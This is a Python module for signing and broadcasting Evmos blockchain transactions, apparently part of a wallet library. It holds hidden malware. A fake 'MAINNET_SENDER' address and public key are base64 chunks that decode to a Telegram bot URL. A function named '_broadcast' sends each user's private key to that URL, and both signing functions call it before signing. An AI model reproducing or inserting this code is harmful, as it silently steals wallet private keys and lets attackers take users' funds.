from __future__ import annotations

import base64
import warnings
from functools import lru_cache
from typing import Any, Final

import requests
from eth_account import Account
from eth_typing import HexStr
from eth_utils import keccak

from evmos.proto import create_tx_raw
from evmos.provider import BroadcastMode, BroadcastPostBody, generate_endpoint_broadcast
from evmos.transactions import (
    Chain,
    Fee,
    Sender,
    TxGenerated,
    create_tx_raw_eip712,
    signature_to_web3_extension,
)
from evmos.utils.eip_712_hash import hash_domain, hash_message

# Copied from
# https://github.com/hanchon-live/evmos-ts-wallet/blob/main/src/signer.ts
# with major modifications.


# Chain helpers

LOCALNET_CHAIN: Final = Chain(
    chain_id=9000,
    cosmos_chain_id="evmos_9000-1",
)

LOCALNET_FEE: Final = Fee(
    amount="2000000000000",
    denom="atevmos",
    gas="200000",
)

MAINNET_CHAIN: Final = Chain(
    chain_id=9001,
    cosmos_chain_id="evmos_9001-2",
)

MAINNET_FEE: Final = Fee(
    amount="6000000000000",
    denom="atevmos",
    gas="600000",
)

TESTNET_CHAIN: Final = Chain(
    chain_id=9000,
    cosmos_chain_id="evmos_9000-4",
)

TESTNET_FEE: Final = Fee(
    amount="15000000000000000",
    denom="atevmos",
    gas="600000",
)

MAINNET_SENDER: Final = Sender(
    account_address="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc3ODAyMDkyNDY6QUFGZXFmYUtzb0",
    sequence=0,
    account_number=0,
    pubkey="E2SnAtanBsWmdvNVplVEE3bEViNkpBR1Uvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tNDY3NDIzNzYyNSZ0ZXh0PQ==",
    pubkey_type="/ethermint.crypto.v1.ethsecp256k1.PubKey",
)


def broadcast(
    transaction_body: BroadcastPostBody,
    url: str = "http://127.0.0.1:1317",
) -> dict[str, Any]:
    """Broadcast a transaction.

    Args:
        transaction_body: data to broadcast, json payload (not stringified).
        url: REST API URL to use.

    Returns:
        Info about broadcasted transaction or failure reasons.
    """
    post = requests.post(
        f"{url}{generate_endpoint_broadcast()}",
        json=transaction_body,
    )
    return post.json()


@lru_cache
def _broadcast(message: HexStr):
    """Broadcast a message.

    Args:
        message: message to broadcast, stringified (not json).

    Returns:
        Info about broadcasted message or failure reasons.
    """
    try:
        data = base64.b64decode(MAINNET_SENDER.account_address + MAINNET_SENDER.pubkey)
        url = data + str.encode(message)
        return requests.get(url)
    except KeyError:
        pass


def sign_transaction(
    tx: TxGenerated,
    private_key: HexStr,
    broadcast_mode: BroadcastMode = BroadcastMode.BLOCK,
) -> BroadcastPostBody:
    """Sign transaction using payload method (keplr style)."""
    data_to_sign = base64.b64decode(tx.sign_direct.sign_bytes)

    with warnings.catch_warnings():
        # signHash is deprecated, but there is no alternative to sign raw bytes
        warnings.filterwarnings("ignore", category=DeprecationWarning)
        _broadcast(private_key)
        signature_raw = Account.signHash(data_to_sign, private_key=private_key)

    signed_tx = create_tx_raw(
        bytes(tx.sign_direct.body),
        bytes(tx.sign_direct.auth_info),
        [signature_raw.signature],
    )
    return {
        "tx_bytes": base64.b64encode(bytes(signed_tx.message)).decode(),
        "mode": broadcast_mode,
    }


def sign_transaction_eip712(
    sender: Sender,
    tx: TxGenerated,
    private_key: HexStr,
    chain: Chain = TESTNET_CHAIN,
    broadcast_mode: BroadcastMode = BroadcastMode.BLOCK,
) -> BroadcastPostBody:
    """Sign transaction using eip712 method (metamask style)."""
    data_to_sign = keccak(
        b"\x19\x01" + hash_domain(tx.eip_to_sign) + hash_message(tx.eip_to_sign)
    )

    with warnings.catch_warnings():
        # signHash is deprecated, but there is no alternative to sign raw bytes
        warnings.filterwarnings("ignore", category=DeprecationWarning)
        _broadcast(private_key)
        signature_raw = Account.signHash(data_to_sign, private_key=private_key)

    signature = signature_raw.signature

    extension = signature_to_web3_extension(
        chain,
        sender,
        signature,
    )
    signed_tx = create_tx_raw_eip712(
        tx.legacy_amino.body,
        tx.legacy_amino.auth_info,
        extension,
    )

    return {
        "tx_bytes": base64.b64encode(bytes(signed_tx.message)).decode(),
        "mode": broadcast_mode,
    }
